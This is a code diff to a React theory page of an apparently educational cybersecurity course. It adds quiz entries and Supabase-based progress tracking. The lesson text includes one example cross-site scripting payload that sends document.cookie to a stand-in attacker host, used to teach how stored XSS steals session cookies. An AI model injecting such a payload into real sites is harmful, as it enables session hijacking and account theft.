@@ -1,7 +1,8 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import QuizWidget from "@/components/QuizWidget";
+import { createClient } from "@/utils/supabase/client";
 
 const introModule = {
   id: "intro",
@@ -281,6 +282,13 @@ const theoryData = [
           </div>
           <p class="mb-4">The Address Resolution Protocol (ARP) acts as the bridge, translating Layer 3 IP addresses into Layer 2 MAC addresses.</p>
         `
+      },
+      {
+        id: "net-quiz",
+        topicId: "MOD_01_QUIZ",
+        title: "1.4 Knowledge Check",
+        shortTitle: "1.4 Knowledge Check",
+        type: "quiz"
       }
     ]
   },
@@ -336,6 +344,13 @@ const theoryData = [
           </ul>
           <p>Modern defenses rely on protocols like SPF (Sender Policy Framework) and DMARC to prevent domain spoofing automatically.</p>
         `
+      },
+      {
+        id: "phish-quiz",
+        topicId: "MOD_02_QUIZ",
+        title: "2.4 Knowledge Check",
+        shortTitle: "2.4 Knowledge Check",
+        type: "quiz"
       }
     ]
   },
@@ -385,6 +400,13 @@ const theoryData = [
               <li><strong>Timeout adjustments:</strong> Reducing the time the server waits for an ACK before dropping the half-open connection.</li>
           </ul>
         `
+      },
+      {
+        id: "ddos-quiz",
+        topicId: "MOD_03_QUIZ",
+        title: "3.4 Knowledge Check",
+        shortTitle: "3.4 Knowledge Check",
+        type: "quiz"
       }
     ]
   },
@@ -413,6 +435,13 @@ const theoryData = [
           <p class="mb-4">To mitigate this, systems use a <strong>Salt</strong>. A salt is a unique, random string of characters added to each user's password before hashing it: <code class="bg-black text-white px-1">Hash(Password + Salt)</code>.</p>
           <p>Even if two users have the same password, their unique salts ensure their final stored hashes are completely different, rendering Rainbow Tables useless.</p>
         `
+      },
+      {
+        id: "crypto-quiz",
+        topicId: "MOD_04_QUIZ",
+        title: "4.3 Knowledge Check",
+        shortTitle: "4.3 Knowledge Check",
+        type: "quiz"
       }
     ]
   },
@@ -443,6 +472,13 @@ const theoryData = [
           <p class="mb-4">If a vulnerable forum allows raw HTML in comments, an attacker can post: <code class="bg-black text-white px-1">&lt;script&gt;fetch('http://hacker.com/?cookie=' + document.cookie)&lt;/script&gt;</code>.</p>
           <p>When an admin views that comment, the script executes in their browser, stealing their session cookie and sending it to the attacker's server.</p>
         `
+      },
+      {
+        id: "web-quiz",
+        topicId: "MOD_05_QUIZ",
+        title: "5.3 Knowledge Check",
+        shortTitle: "5.3 Knowledge Check",
+        type: "quiz"
       }
     ]
   }
@@ -451,6 +487,27 @@ const theoryData = [
 export default function TheoryPage() {
   const [openGroups, setOpenGroups] = useState({ networking: true });
   const [activeModule, setActiveModule] = useState(introModule);
+  const [completedModules, setCompletedModules] = useState([]);
+  
+  const supabase = createClient();
+
+  useEffect(() => {
+    const fetchUserProgress = async () => {
+      const { data: { user } } = await supabase.auth.getUser();
+      if (user) {
+        const { data } = await supabase
+          .from("users")
+          .select("completed_modules")
+          .eq("id", user.id)
+          .single();
+          
+        if (data && data.completed_modules) {
+          setCompletedModules(data.completed_modules);
+        }
+      }
+    };
+    fetchUserProgress();
+  }, [supabase]);
 
   const toggleGroup = (groupId) => {
     setOpenGroups((prev) => ({
@@ -501,6 +558,10 @@ export default function TheoryPage() {
                   <div className="overflow-hidden flex flex-col bg-[#fafafa]">
                     {group.modules.map((mod) => {
                       const isActive = activeModule.id === mod.id;
+                      const isQuiz = mod.type === "quiz";
+                      const baseModId = mod.topicId ? mod.topicId.replace('_QUIZ', '') : "";
+                      const isCleared = isQuiz && completedModules.includes(baseModId);
+
                       return (
                         <button
                           key={mod.id}
@@ -508,10 +569,12 @@ export default function TheoryPage() {
                           className={`text-left border-none outline-none py-3 pr-4 pl-10 font-mono text-sm cursor-pointer transition-all border-b border-gray-300 ${
                             isActive
                               ? "bg-black text-white border-l-4 border-l-success font-bold"
-                              : "bg-transparent text-black border-l-4 border-l-transparent hover:bg-gray-200 hover:border-l-black"
+                              : isCleared
+                                ? "bg-[#e0ffe0] text-black border-l-4 border-l-success hover:bg-[#cbfecb]"
+                                : "bg-transparent text-black border-l-4 border-l-transparent hover:bg-gray-200 hover:border-l-black"
                           }`}
                         >
-                          {mod.shortTitle}
+                          {mod.shortTitle} {isCleared && <span className="ml-1">✅</span>}
                         </button>
                       );
                     })}
